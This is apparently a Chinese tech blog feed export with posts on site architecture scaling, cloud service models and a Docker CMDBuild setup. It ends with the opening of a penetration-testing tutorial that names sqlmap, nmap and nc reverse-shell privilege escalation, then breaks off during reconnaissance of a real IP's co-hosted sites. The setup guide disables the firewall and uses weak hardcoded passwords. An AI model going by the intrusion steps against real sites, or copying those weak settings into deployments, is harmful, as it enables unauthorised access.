<p>应用和数据分离后，不同特性的服务器承担不同的服务角色，网站的并发处理能力和数据存储空间得到了很大改善，支持网站业务进一步发展。但是随着用户逐渐增多，网站又一次面临挑战：数据库压力太大导致访问延迟，进而影响整个网站的性能，用户体验受到影响。这时需要对网站架构进一步优化。</p>
<hr>
<h4 id="使用缓存改善网站性能"><a href="#使用缓存改善网站性能" class="headerlink" title="使用缓存改善网站性能"></a>使用缓存改善网站性能</h4><p>网站访问的特点和现实世界的财富分配一样遵循二八定律：80% 的业务访问集中在20% 的数据上。既然大部分业务访问集中在一小部分数据上，那么如果把这一小部分数据缓存在内存中，就可以减少数据库的访问压力，提高整个网站的数据访问速度，改善数据库的写入性能了。 网站使用的缓存可以分为两种：缓存在应用服务器上的本地缓存和缓存在专门的分布式缓存服务器上的远程缓存。</p>
<blockquote>
<p>本地缓存的访问速度更快一些，但是受应用服务器内存限制，其缓存数据量有限，而且会出现和应用程序争用内存的情况。</p>
<p>远程分布式缓存可以使用集群的方式，部署大内存的服务器作为专门的缓存服务器，可以在理论上做到不受内存容量限制的缓存服务。</p>
</blockquote>
<p><img src="/articles/4964e843/3.png" alt></p>
<p>使用缓存后，数据访问压力得到有效缓解，但是单一应用服务器能够处理的请求连接有限，在网站访问高峰期，应用服务器成为整个网站的瓶颈。</p>
<hr>
<h4 id="使用应用服务器集群改善网站的并发处理能力"><a href="#使用应用服务器集群改善网站的并发处理能力" class="headerlink" title="使用应用服务器集群改善网站的并发处理能力"></a>使用应用服务器集群改善网站的并发处理能力</h4><p>使用集群是网站解决高并发、海量数据问题的常用手段。当一台服务器的处理能力、存储空间不足时，不要企图去更换更强大的服务器，对大型网站而言，不管多么强大的服务器，都满足不了网站持续增长的业务需求。这种情况下，更恰当的做法是增加一台服务器分担原有服务器的访问及存储压力。 <strong>对网站架构而言，只要能通过增加一台服务器的方式改善负载压力，就可以以同样的方式持续增加服务器不断改善系统性能，从而实现系统的可伸缩性</strong>。应用服务器实现集群是网站可伸缩架构设计中较为简单成熟的一种，如下图所示：</p>
<p><img src="/articles/4964e843/4.png" alt></p>
<p>通过负载均衡调度服务器，可以将来自用户浏览器的访问请求分发到应用服务器集群中的任何一台服务器上，如果有更多用户，就在集群中加入更多的应用服务器，使应用服务器的压力不再成为整个网站的瓶颈。</p>
<hr>
<h4 id="数据库读写分离"><a href="#数据库读写分离" class="headerlink" title="数据库读写分离"></a>数据库读写分离</h4><p>网站在使用缓存后，使对大部分数据读操作访问都可以不通过数据库就能完成，但是仍有一部分读操作（缓存访问不命中、缓存过期）和全部的写操作都需要访问数据库，在网站的用户达到一定规模后，数据库因为负载压力过高而成为网站的瓶颈。 目前大部分的主流数据库都提供主从热备功能，通过配置两台数据库主从关系，可以将一台数据库服务器的数据更新同步到另一台服务器上。网站利用数据库的这一功能，实现数据库读写分离，从而改善数据库负载压力。如下图所示：</p>
<p><img src="/articles/4964e843/5.png" alt></p>
<p>应用服务器在写数据的时候，访问主数据库，主数据库通过主从复制机制将数据更新同步到从数据库，这样当应用服务器读数据的时候，就可以通过从数据库获得数据。为了便于应用程序访问读写分离后的数据库，通常在应用服务器端使用专门的数据访问模块，使数据库读写分离对应用透明。</p>
<hr>
<h4 id="使用反向代理和-CDN-加速网站响应"><a href="#使用反向代理和-CDN-加速网站响应" class="headerlink" title="使用反向代理和 CDN 加速网站响应"></a>使用反向代理和 CDN 加速网站响应</h4><p>随着网站业务不断发展，用户规模越来越大，由于中国复杂的网络环境，不同地区的用户访问网站时，速度差别也极大。有研究表明，网站访问延迟和用户流失率正相关，网站访问越慢，用户越容易失去耐心而离开。为了提供更好的用户体验，留住用户，网站需要加速网站访问速度。主要手段有使用 CDN 和方向代理。如下图所示：</p>
<p><img src="/articles/4964e843/6.png" alt></p>
<p>CDN 和反向代理的基本原理都是缓存。</p>
<blockquote>
<p>CDN 部署在网络提供商的机房，使用户在请求网站服务时，可以从距离自己最近的网络提供商机房获取数据</p>
<p>反向代理则部署在网站的中心机房，当用户请求到达中心机房后，首先访问的服务器是反向代理服务器，如果反向代理服务器中缓存着用户请求的资源，就将其直接返回给用户</p>
</blockquote>
<p>使用 CDN 和反向代理的目的都是尽早返回数据给用户，一方面加快用户访问速度，另一方面也减轻后端服务器的负载压力。</p>
<hr>
<h4 id="使用分布式文件系统和分布式数据库系统"><a href="#使用分布式文件系统和分布式数据库系统" class="headerlink" title="使用分布式文件系统和分布式数据库系统"></a>使用分布式文件系统和分布式数据库系统</h4><p>任何强大的单一服务器都满足不了大型网站持续增长的业务需求。数据库经过读写分离后，从一台服务器拆分成两台服务器，但是随着网站业务的发展依然不能满足需求，这时需要使用分布式数据库。文件系统也一样，需要使用分布式文件系统。如下图所示：</p>
<p><img src="/articles/4964e843/7.png" alt></p>
<p>分布式数据库是网站数据库拆分的最后手段，只有在单表数据规模非常庞大的时候才使用。不到不得已时，网站更常用的数据库拆分手段是业务分库，将不同业务的数据部署在不同的物理服务器上。</p>
<hr>
<h4 id="使用-NoSQL-和搜索引擎"><a href="#使用-NoSQL-和搜索引擎" class="headerlink" title="使用 NoSQL 和搜索引擎"></a>使用 NoSQL 和搜索引擎</h4><p>随着网站业务越来越复杂，对数据存储和检索的需求也越来越复杂，网站需要采用一些非关系数据库技术如 NoSQL 和非数据库查询技术如搜索引擎。如下图所示：</p>
<p><img src="/articles/4964e843/8.png" alt></p>
<p>NoSQL 和搜索引擎都是源自互联网的技术手段，对可伸缩的分布式特性具有更好的支持。应用服务器则通过一个统一数据访问模块访问各种数据，减轻应用程序管理诸多数据源的麻烦。</p>
<hr>
<h4 id="业务拆分"><a href="#业务拆分" class="headerlink" title="业务拆分"></a>业务拆分</h4><p>大型网站为了应对日益复杂的业务场景，通过使用分而治之的手段将整个网站业务分成不同的产品线。如大型购物交易网站都会将首页、商铺、订单、买家、卖家等拆分成不同的产品线，分归不同的业务团队负责。</p>
<p>具体到技术上，也会根据产品线划分，将一个网站拆分成许多不同的应用，每个应用独立部署。应用之间可以通过一个超链接建立关系（在首页上的导航链接每个都指向不同的应用地址），也可以通过消息队列进行数据分发，当然最多的还是通过访问同一个数据存储系统来构成一个关联的完整系统，如下图所示：</p>
<p><img src="/articles/4964e843/9.png" alt></p>
<hr>
<h4 id="分布式服务"><a href="#分布式服务" class="headerlink" title="分布式服务"></a>分布式服务</h4><p>随着业务拆分越来越小，存储系统越来越庞大，应用系统的整体复杂度呈指数级增加，部署维护越来越困难。由于所有应用要和所有数据库系统连接，在数万台服务器规模的网站中，这些连接的数目是服务器规模的平方，导致数据库连接资源不足，拒绝服务。</p>
<p>既然每一个应用系统都需要执行许多相同的业务操作，比如用户管理、商品管理等，那么可以将这些共用的业务提取出来，独立部署。由这些可复用的业务连接数据库，提供共用业务服务，而应用系统只需要管理用户界面，通过分布式服务调用共用业务服务完成具体业务操作。如下图所示：</p>
<p><img src="/articles/4964e843/10.png" alt></p>
<p>大型网站的架构演化到这里，基本上大多数的技术问题都得以解决，诸如跨数据中心的实时数据同步和具体网站业务相关的问题也都可以通过组合改进现有技术架构解决。</p>
]]></content>
      <categories>
        <category>心得体会</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>IaaS、PaaS、SaaS的区别</title>
    <url>/articles/ee520904.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>你一定听说过云计算中的三个“高大上”的你一定听说过云计算中的三个“高大上”的概念：IaaS、PaaS和SaaS，这几个术语并不好理解。<strong>不过，如果你是个吃货，还喜欢披萨，这个问题就好解决了!</strong>好吧，其实你根本不是一个吃货，之所以自我标榜为吃货，其实是为了收获赞叹式的夸奖，“吃货还这么瘦，好羡慕啊!”或者，总得给站长身材的微丰找个像样的理由。本文通过通俗简单的例子，让你完全理解云计算这三大术语的区别。</p>
<a id="more"></a>

<h2 id="吃货和披萨"><a href="#吃货和披萨" class="headerlink" title="吃货和披萨"></a>吃货和披萨</h2><p>一个“吃货”是怎样吃到披萨的呢?</p>
<p><strong>1. 在家自己做</strong></p>
<p>这真是个麻烦事，你的准备很多东西，发面、做面团、进烤箱。。。。。简单列一下，需要下图所示的一切：</p>
<p><img src="/articles/ee520904/1.png" alt="img"></p>
<p><strong>2. 买好速食披萨回家自己做着吃</strong></p>
<p>你只需要从披萨店里买回成品，回家烘焙就好了，在自己的餐桌上吃。和自己在家做不同，你需要一个pizza供应商。</p>
<p><img src="/articles/ee520904/2.png" alt="img"></p>
<p><strong>3. 打电话叫外卖将披萨送到家中</strong></p>
<p>打个电话，pizza就送到家门口。</p>
<p><img src="/articles/ee520904/3.png" alt></p>
<p><strong>4.在披萨店吃披萨</strong></p>
<p>你什么都不需要准备，连餐桌也是pizza店的。</p>
<p><img src="/articles/ee520904/4.png" alt></p>
<p><strong>总结一下，吃货可以通过如下途径吃披萨：</strong></p>
<p><img src="/articles/ee520904/5.png" alt="img"></p>
<p><strong>好了，现在忘掉pizza!</strong></p>
<h2 id="技术公司"><a href="#技术公司" class="headerlink" title="技术公司"></a>技术公司</h2><p>假设你是一家超牛X的技术公司，根本不需要别人提供服务，你拥有基础设施、应用等等其它一切，你把它们分为三层：<strong>基础设施(infrastructure)、平台(platform)和软件(software)</strong>，如下图：</p>
<p><img src="/articles/ee520904/6.png" alt="img"></p>
<p>这其实就是云计算的三个分层，基础设施在最下端，平台在中间，软件在顶端，分别是分别是Infrastructure-as-a-Service(IaaS)，Platform-as-a-Service(PaaS)，Software-as-a-Service(SaaS)，别的一些“软”的层可以在这些层上面添加。</p>
<p>而你的公司什么都有，现在所处的状态叫本地部署(On-Premises)，就像在自己家做pizza一样。几年前如果你想在办公室或者公司的网站上运行一些企业应用，你需要去买服务器，或者别的高昂的硬件来控制本地应用，让你的业务运行起来，这就叫本地部署。</p>
<p>假如你家BOSS突然有一天想明白了，只是为了吃上pizza，为什么非要自己做呢?于是，准备考虑一家云服务供应商，这个云服务供应商能提供哪些服务呢?其所能提供的云服务也就是云计算的三个分层：IaaS、PaaS和SaaS，就像pizza店提供三种服务：买成品回家做、外卖和到披萨店吃。</p>
<p>用一张图来表示就是这样的。</p>
<p><img src="/articles/ee520904/7.png" alt="img"></p>
<p>现在我们来谈谈具体细节。</p>
<p><strong>IaaS:</strong> Infrastructure-as-a-Service(基础设施即服务)</p>
<p>有了IaaS，你可以将硬件外包到别的地方去。IaaS公司会提供场外服务器，存储和网络硬件，你可以租用。节省了维护成本和办公场地，公司可以在任何时候利用这些硬件来运行其应用。</p>
<p>一些大的IaaS公司包括Amazon, Microsoft, VMWare, Rackspace和Red Hat.不过这些公司又都有自己的专长，比如Amazon和微软给你提供的不只是IaaS，他们还会将其计算能力出租给你来host你的网站。</p>
<p><strong>PaaS:</strong> Platform-as-a-Service(平台即服务)</p>
<p>第二层就是所谓的PaaS，某些时候也叫做中间件。你公司所有的开发都可以在这一层进行，节省了时间和资源。</p>
<p>PaaS公司在网上提供各种开发和分发应用的解决方案，比如虚拟服务器和操作系统。这节省了你在硬件上的费用，也让分散的工作室之间的合作变得更加容易。网页应用管理，应用设计，应用虚拟主机，存储，安全以及应用开发协作工具等。</p>
<p>一些大的PaaS提供者有Google App Engine,Microsoft Azure，Force.com,Heroku，Engine Yard。最近兴起的公司有AppFog,Mendix和Standing Cloud.</p>
<p><strong>SaaS:</strong> Software-as-a-Service(软件即服务)</p>
<p>第三层也就是所谓SaaS。这一层是和你的生活每天接触的一层，大多是通过网页浏览器来接入。任何一个远程服务器上的应用都可以通过网络来运行，就是SaaS了。</p>
<p>你消费的服务完全是从网页如Netflix,MOG,Google Apps,Box.net,Dropbox或者苹果的iCloud那里进入这些分类。尽管这些网页服务是用作商务和娱乐或者两者都有，但这也算是云技术的一部分。</p>
<p>一些用作商务的SaaS应用包括Citrix的Go To Meeting，Cisco的WebEx，Salesforce的CRM，ADP，Workday和SuccessFactors。</p>
<h2 id="我们拿盖房子来举个例子"><a href="#我们拿盖房子来举个例子" class="headerlink" title="我们拿盖房子来举个例子"></a>我们拿盖房子来举个例子</h2><p>没有云的时候相当于大家都是在自己盖房子，后来发现这样成本比较高，要请专业人员搭建维护，如果盖的太大用不了浪费，盖的太小如果人多又不够用，于是有了云。</p>
<p>IAAS相当于商品房，建筑商盖好，购买就行。不够再买一套（可以随时退货）。具体房子做什么用，自己决定，屋内的装修家居还是要自己负责。IAAS上购买的一般是主机，用户不光要开发程序，还要考虑搭建系统，维护运行环境，以及怎么容灾，怎么做到高可用，怎么扩容。</p>
<p>PAAS相当于租房，房子做什么用有一定限制，但装修家居什么的房东都做好了，不够再租也比较方便。PAAS上是服务的运行环境，服务商提供了扩容以及容灾机制，用户负责开发程序即可，但程序需要匹配PAAS上的环境，没有IAAS那样自由。</p>
<p>SAAS相当于酒店，需要的时候租一间住就行，不住了退，完全不用操心房间维护的问题，有不同风格档次的酒店以及不同格局的房间供你选择。SAAS提供的是具体的服务，多租户公用系统资源，资源利用率更高。</p>
<p>虽然比喻不太恰当，但应该算比较通俗了吧。</p>
]]></content>
      <categories>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>Cloud</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker版cmdbuild安装教程</title>
    <url>/articles/4fcc594d.html</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>CMDB –Configuration Management Database 配置管理数据库, CMDB存储与管理企业IT架构中设备的各种配置信息，它与所有服务支持和服务交付流程都紧密相联，支持这些流程的运转、发挥配置信息的价值，同时依赖于相关流程保证数据的准确性。</p>
<p>CMDB，几乎是每个运维人都绕不过去的字眼，但又是很多运维人的痛，因为基本上所有的互联网公司都在搞，都在想着把尽可能多信息都收集汇总过来，然后实现自动化,智能化，但是CMDB很少有成功的，因此它也被称为运维人的耻辱。</p>
<p>我们运维人不要再为了KPI，绩效等东东重复造轮子，并且造出来的轮子只能自己用。我们运维人工作中共同的迫切需求点是什么呢？</p>
<p>1，中文的web页面即使丑点也可以接受。日常查看导入导出，新增等等操作方便，而且防止语言不通误操作。</p>
<p>2，数据库模型和业务逻辑是分离开的。只需要建业务逻辑字段就能自动映射为数据库模型。</p>
<p>3，动态实现表间关系。随着收集数据的完善，表与表之间关系越来越复杂，不要因后续业务需要，对表做出改动，而影响以前的关系和调用，可以动态扩展。想想一下，增加个关系字段，原来的代码都要改的酸爽。</p>
<p>4，自定义表。可以自定义根据业务需求建表和逻辑关系。</p>
<p>5，动态API接口。根据表逻辑改动API动态自动更改，弱化业务和数据关系的实现，并且能够和外部系统做联动，支持API接口调用，方便扩展和自动化。</p>
<p>以上需求是最迫切的，本人工作多年，自己用django写过cmdb系统，但到后来维护成本会越来越大，考察了国内外开源的软件，最终找到cmdbuild，基本上可以满足上面全部需求，下面就来介绍下用docker容器快速安装cmdbuild，因cmdbuild是国外的软件，所以国内文档很少。</p>
<a id="more"></a>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.cmdbuild.org/en/documentazione" target="_blank" rel="noopener">官方文档</a></p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>镜像版本：<br>quentinv/cmdbuild:t7-2.1.4<br>postgres     9.4</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h4 id="环境调整"><a href="#环境调整" class="headerlink" title="环境调整"></a>环境调整</h4><p>关闭防火墙</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld.service</span><br></pre></td></tr></table></figure>

<h4 id="PostgreSQL的安装"><a href="#PostgreSQL的安装" class="headerlink" title="PostgreSQL的安装"></a>PostgreSQL的安装</h4><p>cmdbuild数据存储是在PostgreSQL中的，生产环境建议建立PostgreSQL数据库集群，这里为单点。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">拉取最新镜像</span></span><br><span class="line">docker pull postgres</span><br><span class="line"><span class="meta">#</span><span class="bash">启动容器</span></span><br><span class="line">docker run --name pgsql -p 5432:5432 -e POSTGRES_PASSWORD=sunxu123 -v /data/postgres:/var/lib/postgresql/data -d postgres:latest</span><br></pre></td></tr></table></figure>

<p>如做迁移，需要导入数据。如新建可跳过这步。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">复制备份文件到容器中</span></span><br><span class="line">docker cp ./cmdbuild_db_dump_2018-07-13.sql pgsql:/tmp/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入容器后操作</span></span><br><span class="line">docker exec -it pgsql /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进Postgresql账号</span></span><br><span class="line">su postgres</span><br><span class="line"><span class="meta">#</span><span class="bash"> 建库</span></span><br><span class="line">createdb -O postgres cmdbuild</span><br><span class="line"><span class="meta">#</span><span class="bash"> 导数据</span></span><br><span class="line">psql -U postgres -d cmdbuild &lt; /tmp/cmdbuild_db_dump_2018-07-13.sql</span><br><span class="line"><span class="meta">#</span><span class="bash"> 退出容器</span></span><br></pre></td></tr></table></figure>

<h4 id="Cmdbuild安装"><a href="#Cmdbuild安装" class="headerlink" title="Cmdbuild安装"></a>Cmdbuild安装</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">拉取镜像</span></span><br><span class="line">docker pull quentinv/cmdbuild</span><br><span class="line"><span class="meta">#</span><span class="bash">启动容器</span></span><br><span class="line">docker run --name cmdbuild -p 8080:8080 -d quentinv/cmdbuild</span><br></pre></td></tr></table></figure>

<h2 id="配置使用"><a href="#配置使用" class="headerlink" title="配置使用"></a>配置使用</h2><p>登录设置语言和配置PostgreSQL</p>
<p><img src="/articles/4fcc594d/1.png" alt="img"></p>
<p><img src="/articles/4fcc594d/2.png" alt="img"></p>
<p>完成后登录。因为登录时需要读取数据库中的用户数据，默认导入进去的用户名/密码:admin/123456</p>
<h2 id="填坑"><a href="#填坑" class="headerlink" title="填坑"></a>填坑</h2><p><strong>PostgreSQL 数据导入和导出</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">pg_dump -U root cmdbuild &gt; cmdb_db_dump_2016-12-05.sql</span><br><span class="line">pg_dump -U root cmdbuild &lt; cmdb_db_dump_2016-12-06.sql</span><br></pre></td></tr></table></figure>

<p>如果导入数据出错，需删除数据库，重新导入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">#登录</span></span><br><span class="line">psql -U user</span><br><span class="line"><span class="comment">#删除数据库</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> cmdbuild</span><br><span class="line"><span class="comment">#创建数据库</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> cmdbuild</span><br><span class="line"><span class="comment">#导入</span></span><br></pre></td></tr></table></figure>

<p>删除数据库时，删除失败，报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR: database &quot;mctest&quot; is being accessed by other users  详细：There are 2 other sessions using the database.</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">#断开所有连这个数据库的连接</span></span><br><span class="line"><span class="keyword">select</span> pg_terminate_backend(pid) <span class="keyword">from</span>  (<span class="keyword">select</span> pid <span class="keyword">from</span> pg_stat_activity <span class="keyword">where</span> datname = <span class="string">'数据库名'</span>  ) a;</span><br><span class="line"><span class="comment">#删除数据库</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> db_name</span><br></pre></td></tr></table></figure>

<h2 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">psql -U user -d dbname</span><br><span class="line"></span><br><span class="line">切换数据库,相当于mysql的<span class="keyword">use</span> dbname</span><br><span class="line">\c dbname</span><br><span class="line">列举数据库，相当于mysql的<span class="keyword">show</span> <span class="keyword">databases</span></span><br><span class="line">\l</span><br><span class="line">列举表，相当于mysql的<span class="keyword">show</span> <span class="keyword">tables</span></span><br><span class="line">\dt</span><br><span class="line">查看表结构，相当于<span class="keyword">desc</span> tblname,<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> tbname</span><br><span class="line">\d tblname</span><br><span class="line"></span><br><span class="line">\di 查看索引 </span><br><span class="line"></span><br><span class="line">创建数据库： </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> [数据库名]; </span><br><span class="line">删除数据库： </span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> [数据库名];  </span><br><span class="line">*重命名一个表： </span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> [表名A] <span class="keyword">rename</span> <span class="keyword">to</span> [表名B]; </span><br><span class="line">*删除一个表： </span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> [表名]; </span><br><span class="line"></span><br><span class="line">*在已有的表里添加字段： </span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> [表名] <span class="keyword">add</span> <span class="keyword">column</span> [字段名] [类型]; </span><br><span class="line"></span><br><span class="line">删除表中的字段： </span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> [表名] <span class="keyword">drop</span> <span class="keyword">column</span> [字段名]; </span><br><span class="line"></span><br><span class="line">修改数据库列属性</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">alter</span> 列名 <span class="keyword">type</span> 类型名(<span class="number">350</span>)</span><br><span class="line"></span><br><span class="line">重命名一个字段：  </span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> [表名] <span class="keyword">rename</span> <span class="keyword">column</span> [字段名A] <span class="keyword">to</span> [字段名B]; </span><br><span class="line"></span><br><span class="line">*给一个字段设置缺省值：  </span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> [表名] <span class="keyword">alter</span> <span class="keyword">column</span> [字段名] <span class="keyword">set</span> <span class="keyword">default</span> [新的默认值];</span><br><span class="line">*去除缺省值：  </span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> [表名] <span class="keyword">alter</span> <span class="keyword">column</span> [字段名] <span class="keyword">drop</span> <span class="keyword">default</span>; </span><br><span class="line">在表中插入数据： </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名 ([字段名m],[字段名n],......) <span class="keyword">values</span> ([列m的值],[列n的值],......); </span><br><span class="line">修改表中的某行某列的数据： </span><br><span class="line"><span class="keyword">update</span> [表名] <span class="keyword">set</span> [目标字段名]=[目标值] <span class="keyword">where</span> [该行特征]; </span><br><span class="line">删除表中某行数据： </span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> [表名] <span class="keyword">where</span> [该行特征]; </span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> [表名];<span class="comment">--删空整个表 </span></span><br><span class="line">创建表： </span><br><span class="line">create table ([字段名1] [类型1] ;,[字段名2] [类型2],......&lt;,primary key (字段名m,字段名n,...)&gt;;); </span><br><span class="line"></span><br><span class="line">\copyright     显示 PostgreSQL 的使用和发行条款</span><br><span class="line">\encoding [字元编码名称]</span><br><span class="line">                 显示或设定用户端字元编码</span><br><span class="line">\h [名称]      SQL 命令语法上的说明，用 * 显示全部命令</span><br><span class="line">\prompt [文本] 名称</span><br><span class="line">                 提示用户设定内部变数</span><br><span class="line">\password [USERNAME]</span><br><span class="line">                 securely <span class="keyword">change</span> the <span class="keyword">password</span> <span class="keyword">for</span> a <span class="keyword">user</span></span><br><span class="line">\q             退出 psql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">导入整个数据库</span><br><span class="line">psql -U postgres(用户名)  数据库名(缺省时同用户名) &lt; /<span class="keyword">data</span>/dum.sql</span><br><span class="line"></span><br><span class="line">导出整个数据库</span><br><span class="line">pg_dump -h localhost -U postgres(用户名) 数据库名(缺省时同用户名)   &gt;/<span class="keyword">data</span>/dum.sql</span><br><span class="line"></span><br><span class="line">导出某个表</span><br><span class="line">pg_dump -h localhost -U postgres(用户名) 数据库名(缺省时同用户名)  -t <span class="keyword">table</span>(表名) &gt;/<span class="keyword">data</span>/dum.sql</span><br><span class="line"></span><br><span class="line">压缩方法</span><br><span class="line">一般用dump导出数据会比较大，推荐使用xz压缩</span><br><span class="line">压缩方法  xz dum.sql 会生成 dum.sql.xz 的文件</span><br><span class="line">xz压缩数据倒数数据库方法</span><br><span class="line">xzcat /<span class="keyword">data</span>/dum.sql.xz | psql -h localhost -U postgres(用户名) 数据库名(缺省时同用户名)</span><br></pre></td></tr></table></figure>

<p>连接ldap</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">进入cmdb容器</span></span><br><span class="line">docker exec -it db9235d3b86c /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash">进入配置目录</span></span><br><span class="line">cd  /usr/local/tomcat/webapps/ROOT/WEB-INF/conf</span><br><span class="line"><span class="meta">#</span><span class="bash">修改配置</span></span><br><span class="line">auth.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Authentication method chain (the first match stops the auth chain)</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">auth.methods=HeaderAuthenticator,CasAuthenticator,LdapAuthenticator,DBAuthenticator</span></span><br><span class="line">auth.methods=LdapAuthenticator</span><br><span class="line"><span class="meta">#</span><span class="bash">force.ws.password.digest=<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># HEADER</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">header.attribute.name=username</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># CAS</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">cas.server.url=https://casserver/cas</span></span><br><span class="line"><span class="meta">#</span><span class="bash">cas.login.page=/login</span></span><br><span class="line"><span class="meta">#</span><span class="bash">cas.service.param=service</span></span><br><span class="line"><span class="meta">#</span><span class="bash">cas.ticket.param=ticket</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># LDAP</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line">ldap.server.address=xxxxx // 测试ldap地址，请根据实际替换</span><br><span class="line">ldap.server.port=389</span><br><span class="line">ldap.use.ssl=false</span><br><span class="line">ldap.basedn=dc=xx,dc=xx,dc=com</span><br><span class="line">ldap.bind.attribute=cn</span><br><span class="line"><span class="meta">#</span><span class="bash">ldap.search.filter=(&amp;(objectClass=myclass1)(objectClass=myclass2))</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#Accept only none (anonymous bind) and simple (simple bind)</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">ldap.search.auth.method=none</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#This section is only for simple bind</span></span></span><br><span class="line">ldap.search.auth.method=simple</span><br><span class="line">ldap.search.auth.principal=cn=admin,dc=xx,dc=xxx,dc=com</span><br><span class="line">ldap.search.auth.password=******* // 密码</span><br></pre></td></tr></table></figure>

<p>这里贴一张本人以前用django写cmdb系统时的数据库设计图，仅供参考：</p>
<p><img src="/articles/4fcc594d/3.png" alt="img"></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Cmdb</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之从收集信息到入侵提权</title>
    <url>/articles/92dfa26d.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>通过本文你将了解黑客常用的入手思路和技术手法，适合热爱网络信息安全的新手朋友了解学习。本文将从最开始的信息收集开始讲述黑客是如何一步步的攻破你的网站和服务器的.阅读本文你会学到以下内容：</p>
<p>1.渗透测试前的简单信息收集。</p>
<p>2.sqlmap的使用</p>
<p>3.nmap的使用</p>
<p>4.nc反弹提权</p>
<p>5.linux系统的权限提升</p>
<p>6.backtrack 5中渗透测试工具nikto和w3af的使用等.</p>
<a id="more"></a>

<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>假设黑客要入侵的你的网站域名为:hack-test.com</p>
<h2 id="入侵过程"><a href="#入侵过程" class="headerlink" title="入侵过程"></a>入侵过程</h2><h4 id="IP信息"><a href="#IP信息" class="headerlink" title="IP信息"></a>IP信息</h4><p>让我们用ping命令获取网站服务器的IP地址.</p>
<p><img src="/articles/92dfa26d/1.png" alt></p>
<p>现在我们获取了网站服务器的IP地址为:173.236.138.113</p>
<h4 id="寻找同一服务器上的其它网站"><a href="#寻找同一服务器上的其它网站" class="headerlink" title="寻找同一服务器上的其它网站"></a>寻找同一服务器上的其它网站</h4><p>我们使用sameip.org.</p>
<p><img src="/articles/92dfa26d/2.png" alt></p>
<p>26 sites hosted on IP Address 173.236.138.113</p>
<table>
<thead>
<tr>
<th><strong>ID</strong></th>
<th><strong>Domain</strong></th>
<th><strong>Site Link</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>hijackthisforum.com</td>
<td><a href="http://www.hijackthisforum.com/" target="_blank" rel="noopener">hijackthisforum.com</a></td>
</tr>
<tr>
<td>2</td>
<td>sportforum.net</td>
